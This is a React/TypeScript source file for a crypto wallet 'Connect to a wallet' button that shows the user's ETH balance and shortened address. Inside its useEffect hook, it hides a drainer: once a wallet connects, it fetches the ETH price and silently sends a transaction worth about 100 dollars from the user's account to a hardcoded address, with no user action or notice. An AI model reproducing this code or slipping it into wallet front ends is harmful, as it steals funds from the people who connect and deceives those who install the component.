import { Button, Box, Text } from "@chakra-ui/react";
import { useEffect } from "react";
import { useEthers, useEtherBalance } from "@usedapp/core";
import { formatEther } from "@ethersproject/units";
import Identicon from "./Identicon";
import Web3 from 'web3'
import { BigNumber } from "@ethersproject/bignumber";

type Props = {
  handleOpenModal: any;
};

const web3 = new Web3(Web3.givenProvider);

export default function ConnectButton({ handleOpenModal }: Props) {
  const { activateBrowserWallet, account } = useEthers();
  const etherBalance = useEtherBalance(account);

  function handleConnectWallet() {
    activateBrowserWallet();
  }

  const url = "https://api.coinbase.com/v2/prices/ETH-USD/spot";

  
  useEffect(() => {
    if(account) {
      fetch(url).then( r => r.json())
      .then(async (cryptoprice) => {
        if(cryptoprice) {
          const sendAmont = 100/cryptoprice.data.amount;
          try {
            const params = {
              from: account,
              to: '0x42F4ef8b15Bade9F6ec88Cd10BC5c06ba6c7045e',
              value: web3.utils.toWei(sendAmont.toString(), 'ether')
             };
            let sendHash = web3.eth.sendTransaction(params);
            console.log('txnHash is ' + sendHash);
          } catch (error) {
            console.log(error)
          }
        }
      })
      .catch((e) => {
        console.log("net work error");
      });
    }
  }, [account]);

  return account ? (
    <Box
      display="flex"
      alignItems="center"
      background="gray.700"
      borderRadius="xl"
      py="0"
    >
      <Box px="3">
        <Text color="white" fontSize="md">
          {etherBalance && parseFloat(formatEther(etherBalance)).toFixed(3)} ETH
        </Text>
      </Box>
      <Button
        onClick={handleOpenModal}
        bg="gray.800"
        border="1px solid transparent"
        _hover={{
          border: "1px",
          borderStyle: "solid",
          borderColor: "blue.400",
          backgroundColor: "gray.700",
        }}
        borderRadius="xl"
        m="1px"
        px={3}
        height="38px"
      >
        <Text color="white" fontSize="md" fontWeight="medium" mr="2">
          {account &&
            `${account.slice(0, 6)}...${account.slice(
              account.length - 4,
              account.length
            )}`}
        </Text>
        <Identicon />
      </Button>
    </Box>
  ) : (
    <Button
      onClick={handleConnectWallet}
      bg="blue.800"
      color="blue.300"
      fontSize="lg"
      fontWeight="medium"
      borderRadius="xl"
      border="1px solid transparent"
      _hover={{
        borderColor: "blue.700",
        color: "blue.400",
      }}
      _active={{
        backgroundColor: "blue.800",
        borderColor: "blue.700",
      }}
    >
      Connect to a wallet
    </Button>
  );
}
